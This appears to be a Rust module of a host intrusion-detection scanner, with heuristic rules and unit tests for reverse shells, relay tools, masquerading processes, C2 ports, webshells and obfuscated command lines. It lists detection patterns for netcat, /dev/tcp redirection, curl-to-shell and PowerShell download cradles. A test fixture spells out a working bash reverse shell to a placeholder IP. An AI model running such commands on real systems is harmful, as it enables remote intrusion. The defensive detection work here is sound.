use crate::models::{
    ConnectionEntry, ExposureScope, IpCategory, ProcessRecord, SecurityFinding, Severity,
};
use crate::scanner::ports_db::{check_backdoor_port, check_sensitive_wildcard_port};
use std::collections::{HashMap, HashSet};

const SHELL_NAMES: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "tcsh",
    "csh",
    "fish",
    "cmd.exe",
    "cmd",
    "powershell.exe",
    "powershell",
    "pwsh.exe",
    "pwsh",
];

const NETCAT_TOOLS: &[&str] = &[
    "nc",
    "nc.exe",
    "ncat",
    "ncat.exe",
    "netcat",
    "netcat.exe",
    "socat",
    "socat.exe",
    "cryptcat",
    "powercat",
];

const SERVER_PARENTS: &[&str] = &[
    "nginx",
    "apache2",
    "httpd",
    "httpd.exe",
    "w3wp.exe",
    "php-fpm",
    "php-cgi",
    "php-cgi.exe",
    "sqlservr.exe",
    "mysqld",
    "mysqld.exe",
    "postgres",
    "postgres.exe",
    "redis-server",
    "mongod",
    "mongod.exe",
    "tomcat",
];

#[derive(Default)]
struct FindingCollector {
    items: Vec<SecurityFinding>,
    seen: HashSet<String>,
}

impl FindingCollector {
    fn contains(&self, key: &str) -> bool {
        self.seen.contains(key)
    }

    fn insert(&mut self, key: String, finding: SecurityFinding) {
        if self.seen.insert(key) {
            self.items.push(finding);
        }
    }
}

pub fn evaluate_security_heuristics(
    connections: &mut [ConnectionEntry],
    processes: &mut HashMap<u32, ProcessRecord>,
) -> Vec<SecurityFinding> {
    let mut collector = FindingCollector::default();

    let listen_ports: HashSet<u16> = connections
        .iter()
        .filter(|c| c.is_listening())
        .map(|c| c.local_port)
        .collect();
    for conn in connections.iter_mut() {
        evaluate_connection(conn, &listen_ports, &mut collector);
    }

    for proc_rec in processes.values_mut() {
        evaluate_process(proc_rec, &mut collector);
    }

    for conn in connections.iter() {
        if let Some(pid) = conn.pid {
            if let Some(proc_rec) = processes.get_mut(&pid) {
                if conn.severity > proc_rec.max_severity {
                    proc_rec.max_severity = conn.severity;
                }
            }
        }
    }

    collector.items.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.rule_id.cmp(&b.rule_id))
    });

    collector.items
}

/// Fixed metadata of one rule. The text that depends on the socket or process is added per hit.
struct Rule {
    id: &'static str,
    category: &'static str,
    mitre: &'static str,
    remediation: &'static str,
}

impl Rule {
    fn finding(
        &self,
        severity: Severity,
        title: String,
        description: String,
        evidence: String,
    ) -> SecurityFinding {
        SecurityFinding {
            rule_id: self.id.to_string(),
            category: self.category.to_string(),
            mitre_id: self.mitre.to_string(),
            severity,
            title,
            description,
            pid: None,
            process_name: None,
            endpoint: None,
            evidence,
            remediation: self.remediation.to_string(),
        }
    }
}

impl SecurityFinding {
    fn at_socket(mut self, conn: &ConnectionEntry, endpoint: String) -> Self {
        self.pid = conn.pid;
        self.process_name = Some(conn.process_name.clone());
        self.endpoint = Some(endpoint);
        self
    }

    fn at_process(mut self, p: &ProcessRecord) -> Self {
        self.pid = Some(p.pid);
        self.process_name = Some(p.name.clone());
        self
    }
}

const REV_SHELL: Rule = Rule {
    id: "H01-REV-SHELL",
    category: "Reverse / Bind Shell",
    mitre: "T1059",
    remediation: "Terminate the process tree and inspect the parent process.",
};
const RAW_RELAY: Rule = Rule {
    id: "H01-RAW-RELAY",
    category: "Socket Relay Utility",
    mitre: "T1095",
    remediation: "Terminate if unauthorized and check user persistence.",
};
const INLINE_SHELL: Rule = Rule {
    id: "H01-INLINE-SHELL",
    category: "Reverse Shell",
    mitre: "T1059.006",
    remediation: "Terminate the interpreter process and inspect its parent.",
};
const TEMP_NET_EXEC: Rule = Rule {
    id: "H02-TEMP-NET-EXEC",
    category: "Suspicious Execution Path",
    mitre: "T1204",
    remediation: "Quarantine the binary and terminate the process.",
};
const TEMP_EXEC: Rule = Rule {
    id: "H02-TEMP-EXEC",
    category: "Suspicious Execution Path",
    mitre: "T1204",
    remediation: "Verify if an installer is active; otherwise quarantine the binary.",
};
const FILELESS_BINARY: Rule = Rule {
    id: "H03-FILELESS-BINARY",
    category: "Unlinked / Deleted Binary",
    mitre: "T1620",
    remediation: "Inspect /proc/<pid>/exe before terminating the process.",
};
const MASQUERADING: Rule = Rule {
    id: "H04-MASQUERADING",
    category: "Process Masquerading",
    mitre: "T1036.005",
    remediation: "Verify the binary hash against clean OS files and terminate if unauthorized.",
};
const BACKDOOR_PORT: Rule = Rule {
    id: "H05-BACKDOOR-PORT",
    category: "Suspicious Port",
    mitre: "T1571",
    remediation: "Verify whether this listener is intentional; otherwise terminate and block the port.",
};
const OUTBOUND_C2_PORT: Rule = Rule {
    id: "H05-OUTBOUND-C2-PORT",
    category: "Suspicious Outbound Port",
    mitre: "T1571",
    remediation: "Block the remote IP at the firewall and inspect the binary.",
};
/// Remediation depends on the service, so it comes from `ports_db`.
const EXPOSED_SERVICE: Rule = Rule {
    id: "H06-EXPOSED-SERVICE",
    category: "Exposed Network Service",
    mitre: "T1190",
    remediation: "",
};
const SERVER_SHELL: Rule = Rule {
    id: "H06-SERVER-SHELL",
    category: "Webshell / Server RCE",
    mitre: "T1505.003",
    remediation: "Isolate the service, inspect server logs, and kill the process tree.",
};
const OBFUSCATED_CMD: Rule = Rule {
    id: "H07-OBFUSCATED-CMD",
    category: "Suspicious Command Line",
    mitre: "T1027",
    remediation: "Decode the payload, inspect parent process lineage, and terminate if unauthorized.",
};

/// Lowercased text of one socket's owner, computed once for all socket rules.
struct SocketView {
    proc_lower: String,
    exe_lower: String,
    cmd_lower: String,
    is_listening: bool,
    /// On a port this host listens on. Its remote port is the peer's random source port,
    /// so the outbound C2 port rule must not read it.
    is_inbound: bool,
}

type SocketRule = fn(&mut ConnectionEntry, &SocketView, &mut FindingCollector);

/// The order only decides the order of `risk_reasons`.
const SOCKET_RULES: [SocketRule; 8] = [
    shell_owns_socket,
    relay_tool_socket,
    inline_script_shell,
    temp_path_socket,
    c2_port_local,
    c2_port_remote,
    all_interfaces_listener,
    unresolved_external_peer,
];

fn evaluate_connection(
    conn: &mut ConnectionEntry,
    listen_ports: &HashSet<u16>,
    collector: &mut FindingCollector,
) {
    let is_listening = conn.is_listening();
    let view = SocketView {
        proc_lower: conn.process_name.to_lowercase(),
        exe_lower: conn.exe_path.to_lowercase().replace('/', "\\"),
        cmd_lower: conn.cmdline.to_lowercase(),
        is_listening,
        is_inbound: !is_listening && listen_ports.contains(&conn.local_port),
    };
    for rule in SOCKET_RULES {
        rule(conn, &view, collector);
    }
}

/// H01: an interactive shell holds a socket.
fn shell_owns_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
    if !SHELL_NAMES.contains(&v.proc_lower.as_str()) {
        return;
    }
    conn.elevate_severity(
        Severity::Critical,
        format!("Command shell '{}' owns a network socket ({})", conn.process_name, conn.state),
    );
    let finding = REV_SHELL
        .finding(
            Severity::Critical,
            format!("Active Socket Bound to Shell ({})", conn.process_name),
            format!(
                "Shell '{}' (PID {}) holds a {} socket on {} -> {}.",
                conn.process_name,
                conn.pid.unwrap_or(0),
                conn.protocol.as_str(),
                conn.local_endpoint(),
                conn.remote_display()
            ),
            format!("Lineage: {} | Cmd: {}", conn.lineage.join(" -> "), conn.cmdline),
        )
        .at_socket(conn, format!("{} -> {}", conn.local_endpoint(), conn.remote_endpoint()));
    out.insert(format!("H01-SHELL-{}-{:?}", conn.process_name, conn.pid), finding);
}

/// H01: netcat, socat and similar relays hold a socket.
fn relay_tool_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
    if !NETCAT_TOOLS.contains(&v.proc_lower.as_str()) {
        return;
    }
    conn.elevate_severity(
        Severity::Critical,
        format!("Socket relay tool '{}' active on network", conn.process_name),
    );
    let finding = RAW_RELAY
        .finding(
            Severity::Critical,
            format!("Netcat / Socat Relay Active ({})", conn.process_name),
            format!(
                "Relay utility '{}' (PID {}) is {} on {}.",
                conn.process_name,
                conn.pid.unwrap_or(0),
                conn.state,
                conn.local_endpoint()
            ),
            format!("Cmd: {} | Exe: {}", conn.cmdline, conn.exe_path),
        )
        .at_socket(conn, conn.local_endpoint());
    out.insert(format!("H01-NETCAT-{}-{:?}", conn.process_name, conn.pid), finding);
}

/// H01: an interpreter runs an inline socket or PTY payload.
fn inline_script_shell(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
    if !is_scripting_reverse_shell(&v.proc_lower, &v.cmd_lower) {
        return;
    }
    conn.elevate_severity(
        Severity::Critical,
        "Scripting interpreter running inline socket/PTY payload".to_string(),
    );
    let finding = INLINE_SHELL
        .finding(
            Severity::Critical,
            format!("Inline Scripting Reverse Shell ({})", conn.process_name),
            format!(
                "Interpreter '{}' (PID {}) is running inline socket/shell primitives connected to {}.",
                conn.process_name,
                conn.pid.unwrap_or(0),
                conn.remote_display()
            ),
            format!("Cmdline: {}", conn.cmdline),
        )
        .at_socket(conn, format!("{} -> {}", conn.local_endpoint(), conn.remote_endpoint()));
    out.insert(format!("H01-SCRIPT-SHELL-{:?}", conn.pid), finding);
}

/// H02: the socket owner runs from a temp or world-writable folder.
fn temp_path_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
    let Some(reason) = check_suspicious_exec_path(&conn.exe_path, &v.exe_lower) else {
        return;
    };
    conn.elevate_severity(Severity::Critical, reason.clone());
    let finding = TEMP_NET_EXEC
        .finding(
            Severity::Critical,
            format!("Network-Active Binary in Temp/Writable Path ({})", conn.process_name),
            format!(
                "Process '{}' (PID {}) has active socket {} while running from {}.",
                conn.process_name,
                conn.pid.unwrap_or(0),
                conn.local_endpoint(),
                reason
            ),
            format!("Exe: {}", conn.exe_path),
        )
        .at_socket(conn, conn.local_endpoint());
    out.insert(format!("H02-NET-PATH-{:?}-{}", conn.pid, conn.exe_path), finding);
}

/// H05: a listener, or a socket on a fixed low port, uses a known C2 or RAT port.
fn c2_port_local(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
    // Ports from 32768 up on a non-listening socket are OS-chosen source ports.
    if !(v.is_listening || conn.local_port < 32768) {
        return;
    }
    let Some(intel) = check_backdoor_port(conn.local_port) else {
        return;
    };
    conn.elevate_severity(intel.severity, format!("{}: {}", intel.threat_name, intel.reason));
    let finding = BACKDOOR_PORT
        .finding(
            intel.severity,
            format!(
                "Port {} Associated with {} ({})",
                conn.local_port, intel.threat_name, conn.process_name
            ),
            format!(
                "{} Process '{}' (PID {}) is using local port {} ({}).",
                intel.reason,
                conn.process_name,
                conn.pid.unwrap_or(0),
                conn.local_port,
                conn.state
            ),
            format!(
                "Endpoint: {} | Process: {} | Exe: {}",
                conn.local_endpoint(),
                conn.process_name,
                conn.exe_path
            ),
        )
        .at_socket(conn, conn.local_endpoint());
    out.insert(format!("H05-LOCAL-PORT-{}-{:?}", conn.local_port, conn.pid), finding);
}

/// H05: an outbound connection goes to a known C2, RAT or mining port.
fn c2_port_remote(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
    let Some(rem_port) = conn.remote_port.filter(|_| !v.is_inbound) else {
        return;
    };
    let Some(intel) = check_backdoor_port(rem_port) else {
        return;
    };
    conn.elevate_severity(
        intel.severity,
        format!("Outbound connection to {}: {}", intel.threat_name, intel.reason),
    );
    let finding = OUTBOUND_C2_PORT
        .finding(
            intel.severity,
            format!("Outbound Connection to Port {} ({})", rem_port, intel.threat_name),
            format!(
                "Process '{}' (PID {}) is connected to {} on port {}. {}",
                conn.process_name,
                conn.pid.unwrap_or(0),
                conn.remote_display(),
                rem_port,
                intel.reason
            ),
            format!(
                "{} -> {} | Exe: {}",
                conn.local_endpoint(),
                conn.remote_display(),
                conn.exe_path
            ),
        )
        .at_socket(conn, conn.remote_endpoint());
    out.insert(format!("H05-REM-PORT-{}-{:?}", rem_port, conn.pid), finding);
}

/// H06: a sensitive service listens on 0.0.0.0 or ::. Any other TCP listener there is Low.
fn all_interfaces_listener(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
    if !(v.is_listening && conn.exposure == ExposureScope::WildcardAllInterfaces) {
        return;
    }
    let Some(rule) = check_sensitive_wildcard_port(conn.local_port) else {
        if conn.protocol.is_tcp() && conn.service_name != "Win-RPC-Dyn" {
            conn.elevate_severity(
                Severity::Low,
                "TCP listener bound to all interfaces (0.0.0.0 / ::)".to_string(),
            );
        }
        return;
    };
    conn.elevate_severity(
        rule.severity,
        format!(
            "{} (port {}) bound to all interfaces (0.0.0.0/::)",
            rule.service, rule.port
        ),
    );
    let mut finding = EXPOSED_SERVICE
        .finding(
            rule.severity,
            format!("{} (Port {}) Exposed on All Interfaces", rule.service, rule.port),
            format!(
                "{} Process '{}' (PID {}) is listening on {}.",
                rule.risk_summary,
                conn.process_name,
                conn.pid.unwrap_or(0),
                conn.local_endpoint()
            ),
            format!(
                "Listener: {} ({}) | Process: {} | Exe: {}",
                conn.local_endpoint(),
                conn.protocol.as_str(),
                conn.process_name,
                conn.exe_path
            ),
        )
        .at_socket(conn, conn.local_endpoint());
    finding.remediation = rule.remediation.to_string();
    out.insert(format!("H06-WILDCARD-{}-{}", conn.local_port, conn.process_name), finding);
}

/// Low: a public peer talks to a process whose binary path is unknown.
fn unresolved_external_peer(conn: &mut ConnectionEntry, _v: &SocketView, _out: &mut FindingCollector) {
    if conn.remote_category == IpCategory::PublicInternet
        && conn.exe_path.is_empty()
        && conn.pid.unwrap_or(0) > 4
        && !crate::scanner::network::is_windows_rpc_system_process(&conn.process_name)
    {
        conn.elevate_severity(
            Severity::Low,
            "External connection from process with unresolvable binary path".to_string(),
        );
    }
}

/// Lowercased text of one process, computed once for all process rules.
struct ProcessView {
    name_lower: String,
    exe_lower: String,
    cmd_lower: String,
}

type ProcessRule = fn(&mut ProcessRecord, &ProcessView, &mut FindingCollector);

const PROCESS_RULES: [ProcessRule; 5] = [
    deleted_binary,
    masquerading,
    temp_path_process,
    server_spawned_shell,
    suspicious_cmdline,
];

fn evaluate_process(proc_rec: &mut ProcessRecord, collector: &mut FindingCollector) {
    let view = ProcessView {
        name_lower: proc_rec.name.to_lowercase(),
        exe_lower: proc_rec.exe_path.to_lowercase().replace('/', "\\"),
        cmd_lower: proc_rec.cmdline.to_lowercase(),
    };
    for rule in PROCESS_RULES {
        rule(proc_rec, &view, collector);
    }
}

fn raise_severity(p: &mut ProcessRecord, sev: Severity) {
    if sev > p.max_severity {
        p.max_severity = sev;
    }
}

/// H03: the process image is unlinked or memfd-backed.
fn deleted_binary(p: &mut ProcessRecord, _v: &ProcessView, out: &mut FindingCollector) {
    if !p.is_deleted_binary {
        return;
    }
    raise_severity(p, Severity::Critical);
    let finding = FILELESS_BINARY
        .finding(
            Severity::Critical,
            format!("Process Running from Deleted or Memory Binary ({})", p.name),
            format!(
                "Process '{}' (PID {}) is executing from an unlinked binary or memfd descriptor ('{}').",
                p.name, p.pid, p.exe_path
            ),
            format!(
                "Exe: {} | Cmd: {} | Lineage: {}",
                p.exe_path,
                p.cmdline,
                p.lineage.join(" -> ")
            ),
        )
        .at_process(p);
    out.insert(format!("H03-DELETED-{}", p.pid), finding);
}

/// H04: typosquats, kernel-thread look-alikes, and system binaries outside System32.
fn masquerading(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
    let Some((sev, reason)) =
        check_process_masquerading(&v.name_lower, &v.cmd_lower, &v.exe_lower, &p.exe_path)
    else {
        return;
    };
    raise_severity(p, sev);
    let finding = MASQUERADING
        .finding(
            sev,
            format!("System Process Masquerading: {} (PID {})", p.name, p.pid),
            reason,
            format!("Exe: {} | Lineage: {}", p.exe_path, p.lineage.join(" -> ")),
        )
        .at_process(p);
    out.insert(format!("H04-MASQ-{}", p.pid), finding);
}

/// H02: the process runs from a temp folder. Skipped when the socket rule already reported it.
fn temp_path_process(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
    let Some(reason) = check_suspicious_exec_path(&p.exe_path, &v.exe_lower) else {
        return;
    };
    let sev = if p.open_sockets_count > 0 {
        Severity::Critical
    } else {
        Severity::High
    };
    raise_severity(p, sev);
    if out.contains(&format!("H02-NET-PATH-{:?}-{}", Some(p.pid), p.exe_path)) {
        return;
    }
    let finding = TEMP_EXEC
        .finding(
            sev,
            format!("Process Running from Temp/Writable Directory ({})", p.name),
            format!("Process '{}' (PID {}) is executing from {}.", p.name, p.pid, reason),
            format!("Exe: {} | Cmd: {}", p.exe_path, p.cmdline),
        )
        .at_process(p);
    out.insert(format!("H02-PROC-PATH-{}", p.pid), finding);
}

/// H06: a web or database server is the direct parent of a shell.
fn server_spawned_shell(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
    if !SHELL_NAMES.contains(&v.name_lower.as_str()) || p.lineage.len() < 2 {
        return;
    }
    let parent_entry = p.lineage[p.lineage.len() - 2].to_lowercase();
    if !SERVER_PARENTS.iter().any(|&srv| parent_entry.starts_with(srv)) {
        return;
    }
    raise_severity(p, Severity::Critical);
    let finding = SERVER_SHELL
        .finding(
            Severity::Critical,
            format!("Server Daemon Spawned Shell ({})", p.name),
            format!(
                "Shell '{}' (PID {}) was spawned by server process '{}'.",
                p.name,
                p.pid,
                p.lineage.join(" -> ")
            ),
            format!("Lineage: {} | Cmd: {}", p.lineage.join(" -> "), p.cmdline),
        )
        .at_process(p);
    out.insert(format!("H06-WEBSHELL-{}", p.pid), finding);
}

/// H07: encoded PowerShell, download cradles, /dev/tcp, curl | sh, LOLBins.
fn suspicious_cmdline(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
    let Some((sev, indicator)) = check_suspicious_cmdline(&v.name_lower, &v.cmd_lower) else {
        return;
    };
    raise_severity(p, sev);
    let finding = OBFUSCATED_CMD
        .finding(
            sev,
            format!("Suspicious Command-Line Payload in {} (PID {})", p.name, p.pid),
            format!("Process '{}' launched with arguments matching: {}.", p.name, indicator),
            format!("Cmdline: {}", p.cmdline),
        )
        .at_process(p);
    out.insert(format!("H07-CMDLINE-{}", p.pid), finding);
}

impl ConnectionEntry {
    pub fn elevate_severity(&mut self, sev: Severity, reason: String) {
        if sev > self.severity {
            self.severity = sev;
        }
        if !self.risk_reasons.contains(&reason) {
            self.risk_reasons.push(reason);
        }
    }
}

fn is_scripting_reverse_shell(proc_lower: &str, cmd_lower: &str) -> bool {
    let is_script_engine = proc_lower.starts_with("python")
        || proc_lower.starts_with("perl")
        || proc_lower.starts_with("ruby")
        || proc_lower.starts_with("php")
        || proc_lower.starts_with("lua")
        || proc_lower == "awk"
        || proc_lower == "gawk";

    if !is_script_engine {
        return false;
    }

    let indicators = [
        "socket.socket",
        "pty.spawn",
        "/bin/sh",
        "/bin/bash",
        "tcpsocket.open",
        "tcpsocket.new",
        "fsockopen(",
        "subprocess.call",
        "subprocess.popen",
        "os.dup2(",
        "/dev/tcp/",
    ];

    indicators.iter().any(|&ind| cmd_lower.contains(ind))
}

fn check_suspicious_exec_path(raw_path: &str, exe_lower: &str) -> Option<String> {
    if raw_path.is_empty() {
        return None;
    }

    if raw_path.starts_with("/tmp/")
        || raw_path.starts_with("/var/tmp/")
        || raw_path.starts_with("/dev/shm/")
        || raw_path.starts_with("/run/shm/")
    {
        return Some(format!(
            "Linux temporary/shared-memory directory ({})",
            raw_path
        ));
    }

    let win_suspicious = [
        ("\\appdata\\local\\temp\\", "User AppData Local Temp folder"),
        ("\\windows\\temp\\", "Windows system Temp folder"),
        ("\\users\\public\\", "Windows Public Users folder"),
        ("\\$recycle.bin\\", "Windows Recycle Bin"),
        ("\\perflogs\\", "Windows PerfLogs directory"),
    ];

    for (pattern, desc) in win_suspicious {
        if exe_lower.contains(pattern) {
            return Some(format!("{} ({})", desc, raw_path));
        }
    }

    None
}

fn check_process_masquerading(
    name_lower: &str,
    cmd_lower: &str,
    exe_lower: &str,
    raw_exe: &str,
) -> Option<(Severity, String)> {
    let typosquats = [
        ("scvhost.exe", "svchost.exe"),
        ("svch0st.exe", "svchost.exe"),
        ("svchosts.exe", "svchost.exe"),
        ("lsas.exe", "lsass.exe"),
        ("1sass.exe", "lsass.exe"),
        ("isass.exe", "lsass.exe"),
        ("csrs.exe", "csrss.exe"),
        ("cssrs.exe", "csrss.exe"),
        ("expl0rer.exe", "explorer.exe"),
    ];
    for (fake, real) in typosquats {
        if name_lower == fake {
            return Some((
                Severity::Critical,
                format!(
                    "Process name '{}' is a typosquat of system binary '{}'.",
                    fake, real
                ),
            ));
        }
    }

    // sysinfo fills `name` from comm, which has no brackets, and `exec -a` changes only argv[0].
    // Check both. A real kernel thread has no exe, so a non-empty exe is the signal.
    let looks_like_kthread = |s: &str| {
        let s = s.trim_matches(&['[', ']'][..]);
        s == "kthreadd"
            || ["kworker/", "ksoftirqd/", "migration/", "rcu_"]
                .iter()
                .any(|p| s.starts_with(p))
    };
    let argv0 = cmd_lower.split_whitespace().next().unwrap_or("");
    if !raw_exe.is_empty() && (looks_like_kthread(name_lower) || looks_like_kthread(argv0)) {
        return Some((
            Severity::Critical,
            format!(
                "Userland binary '{}' is masquerading as a Linux kernel thread ('{}').",
                raw_exe, name_lower
            ),
        ));
    }

    if !exe_lower.is_empty() {
        let win_sys32_only = [
            "svchost.exe",
            "lsass.exe",
            "csrss.exe",
            "services.exe",
            "smss.exe",
            "wininit.exe",
            "winlogon.exe",
            "dwm.exe",
            "spoolsv.exe",
            "taskhostw.exe",
        ];
        if win_sys32_only.contains(&name_lower) {
            let valid = exe_lower.contains(":\\windows\\system32\\")
                || exe_lower.contains(":\\windows\\syswow64\\")
                || exe_lower.contains(":\\windows\\winsxs\\");
            if !valid {
                return Some((
                    Severity::Critical,
                    format!(
                        "Windows system process '{}' is running from non-standard path '{}'.",
                        name_lower, raw_exe
                    ),
                ));
            }
        }
    }

    None
}

fn check_suspicious_cmdline(name_lower: &str, cmd_lower: &str) -> Option<(Severity, &'static str)> {
    if name_lower.starts_with("powershell") || name_lower.starts_with("pwsh") {
        if cmd_lower.contains(" -enc ")
            || cmd_lower.contains(" -encodedcommand ")
            || cmd_lower.contains("frombase64string")
        {
            return Some((
                Severity::High,
                "Base64-encoded PowerShell command (-EncodedCommand / FromBase64String)",
            ));
        }
        if cmd_lower.contains("downloadstring(")
            || cmd_lower.contains("downloaddata(")
            || (cmd_lower.contains("iex") && cmd_lower.contains("http"))
            || (cmd_lower.contains("invoke-expression") && cmd_lower.contains("http"))
        {
            return Some((
                Severity::Critical,
                "PowerShell remote download cradle (IEX / DownloadString)",
            ));
        }
    }

    if cmd_lower.contains("/dev/tcp/") || cmd_lower.contains("/dev/udp/") {
        return Some((
            Severity::Critical,
            "Bash /dev/tcp or /dev/udp socket redirection",
        ));
    }

    if (cmd_lower.contains("curl ") || cmd_lower.contains("wget "))
        && (cmd_lower.contains("| sh")
            || cmd_lower.contains("| bash")
            || cmd_lower.contains("|sh")
            || cmd_lower.contains("|bash"))
    {
        return Some((
            Severity::High,
            "Remote script piped directly into shell (curl/wget | sh)",
        ));
    }

    if cmd_lower.contains("nc -e ")
        || cmd_lower.contains("ncat -e ")
        || cmd_lower.contains("mkfifo /tmp/")
    {
        return Some((
            Severity::Critical,
            "Netcat -e / named-pipe reverse shell execution",
        ));
    }

    if (name_lower.starts_with("mshta")
        || name_lower.starts_with("regsvr32")
        || name_lower.starts_with("rundll32"))
        && (cmd_lower.contains("http://")
            || cmd_lower.contains("https://")
            || cmd_lower.contains("javascript:")
            || cmd_lower.contains("vbscript:"))
    {
        return Some((
            Severity::Critical,
            "Windows LOLBin (mshta/regsvr32/rundll32) executing remote or scriptlet payload",
        ));
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{Protocol, Severity};
    use std::net::{IpAddr, Ipv4Addr};

    #[test]
    fn test_reverse_shell_and_backdoor_port_detection() {
        let mut connections = vec![ConnectionEntry {
            id: 1,
            protocol: Protocol::Tcp,
            local_ip: IpAddr::V4(Ipv4Addr::new(192, 168, 1, 50)),
            local_port: 51234,
            remote_ip: Some(IpAddr::V4(Ipv4Addr::new(198, 51, 100, 99))),
            remote_port: Some(4444),
            remote_hostname: None,
            state: "ESTABLISHED".to_string(),
            pid: Some(9001),
            process_name: "bash".to_string(),
            exe_path: "/usr/bin/bash".to_string(),
            cmdline: "bash -i".to_string(),
            sha256: None,
            lineage: vec!["nginx(400)".to_string(), "bash(9001)".to_string()],
            service_name: "Metasploit/C2".to_string(),
            exposure: ExposureScope::LocalLan,
            remote_category: IpCategory::PublicInternet,
            severity: Severity::Safe,
            risk_reasons: Vec::new(),
        }];

        let mut processes = HashMap::new();
        processes.insert(
            9001,
            ProcessRecord {
                pid: 9001,
                ppid: Some(400),
                name: "bash".to_string(),
                exe_path: "/usr/bin/bash".to_string(),
                cmdline: "bash -i >& /dev/tcp/198.51.100.99/4444 0>&1".to_string(),
                user: "www-data".to_string(),
                sha256: None,
                lineage: vec!["nginx(400)".to_string(), "bash(9001)".to_string()],
                cpu_usage: 0.5,
                memory_bytes: 4096,
                run_time_secs: 15,
                exe_exists_on_disk: true,
                is_deleted_binary: false,
                open_sockets_count: 1,
                max_severity: Severity::Safe,
            },
        );

        let findings = evaluate_security_heuristics(&mut connections, &mut processes);
        assert_eq!(connections[0].severity, Severity::Critical);
        assert!(findings.iter().any(|f| f.rule_id == "H01-REV-SHELL"));
        assert!(findings.iter().any(|f| f.rule_id == "H05-OUTBOUND-C2-PORT"));
        assert!(findings.iter().any(|f| f.rule_id == "H06-SERVER-SHELL"));
        assert!(findings.iter().any(|f| f.rule_id == "H07-OBFUSCATED-CMD"));
    }

    #[test]
    fn test_masquerading_and_deleted_binary_detection() {
        let mut connections = Vec::new();
        let mut processes = HashMap::new();

        processes.insert(
            6660,
            ProcessRecord {
                pid: 6660,
                ppid: Some(1000),
                name: "svchost.exe".to_string(),
                exe_path: r"C:\Users\admin\AppData\Local\Temp\svchost.exe".to_string(),
                cmdline: r"C:\Users\admin\AppData\Local\Temp\svchost.exe".to_string(),
                user: "admin".to_string(),
                sha256: None,
                lineage: vec!["explorer.exe(1000)".to_string(), "svchost.exe(6660)".to_string()],
                cpu_usage: 12.0,
                memory_bytes: 1024 * 1024,
                run_time_secs: 60,
                exe_exists_on_disk: true,
                is_deleted_binary: false,
                open_sockets_count: 0,
                max_severity: Severity::Safe,
            },
        );

        processes.insert(
            7770,
            ProcessRecord {
                pid: 7770,
                ppid: Some(1),
                name: "[kworker/0:1]".to_string(),
                exe_path: "/dev/shm/.kworker (deleted)".to_string(),
                cmdline: "[kworker/0:1]".to_string(),
                user: "root".to_string(),
                sha256: None,
                lineage: vec!["systemd(1)".to_string(), "[kworker/0:1](7770)".to_string()],
                cpu_usage: 95.0,
                memory_bytes: 8 * 1024 * 1024,
                run_time_secs: 300,
                exe_exists_on_disk: false,
                is_deleted_binary: true,
                open_sockets_count: 1,
                max_severity: Severity::Safe,
            },
        );

        let findings = evaluate_security_heuristics(&mut connections, &mut processes);
        assert!(findings.iter().any(|f| f.rule_id == "H04-MASQUERADING" && f.pid == Some(6660)));
        assert!(findings.iter().any(|f| f.rule_id == "H02-TEMP-EXEC" && f.pid == Some(6660)));
        assert!(findings.iter().any(|f| f.rule_id == "H03-FILELESS-BINARY" && f.pid == Some(7770)));
        assert!(findings.iter().any(|f| f.rule_id == "H04-MASQUERADING" && f.pid == Some(7770)));
    }

    #[test]
    fn test_kernel_thread_masquerade_uses_comm_and_argv0() {
        // sysinfo reports comm without brackets; `exec -a` only changes argv[0].
        let by_argv0 = check_process_masquerading("x", "[kworker/0:0]", "\\tmp\\x", "/tmp/x");
        assert_eq!(by_argv0.map(|r| r.0), Some(Severity::Critical));
        let by_comm = check_process_masquerading("kworker/0:0", "/tmp/x", "\\tmp\\x", "/tmp/x");
        assert_eq!(by_comm.map(|r| r.0), Some(Severity::Critical));
        // A real kernel thread has no exe. A legitimate tool with a similar prefix is not flagged.
        assert!(check_process_masquerading("kworker/0:1", "kworker/0:1", "", "").is_none());
        let tool = "/usr/bin/migration-tool";
        assert!(check_process_masquerading("migration-tool", tool, tool, tool).is_none());
    }

    fn socket(state: &str, local_port: u16, remote_port: Option<u16>) -> ConnectionEntry {
        ConnectionEntry {
            id: 1,
            protocol: Protocol::Tcp,
            local_ip: IpAddr::V4(Ipv4Addr::new(192, 168, 1, 50)),
            local_port,
            remote_ip: remote_port.map(|_| IpAddr::V4(Ipv4Addr::new(198, 51, 100, 7))),
            remote_port,
            remote_hostname: None,
            state: state.to_string(),
            pid: Some(500),
            process_name: "sshd".to_string(),
            exe_path: "/usr/sbin/sshd".to_string(),
            cmdline: "sshd".to_string(),
            sha256: None,
            lineage: Vec::new(),
            service_name: "SSH".to_string(),
            exposure: ExposureScope::LocalLan,
            remote_category: IpCategory::PublicInternet,
            severity: Severity::Safe,
            risk_reasons: Vec::new(),
        }
    }

    #[test]
    fn test_c2_port_rule_skips_inbound_connections() {
        // 45560 is a mining-pool port, but here it is a client's random source port.
        let mut inbound = vec![
            socket("LISTEN", 22, None),
            socket("ESTABLISHED", 22, Some(45560)),
        ];
        let findings = evaluate_security_heuristics(&mut inbound, &mut HashMap::new());
        assert!(!findings.iter().any(|f| f.rule_id == "H05-OUTBOUND-C2-PORT"));

        let mut outbound = vec![socket("ESTABLISHED", 51234, Some(45560))];
        let findings = evaluate_security_heuristics(&mut outbound, &mut HashMap::new());
        assert!(findings.iter().any(|f| f.rule_id == "H05-OUTBOUND-C2-PORT"));
    }

    fn proc_rec(pid: u32, name: &str, exe: &str, cmd: &str, lineage: &[&str]) -> ProcessRecord {
        ProcessRecord {
            pid,
            ppid: None,
            name: name.to_string(),
            exe_path: exe.to_string(),
            cmdline: cmd.to_string(),
            user: "u".to_string(),
            sha256: None,
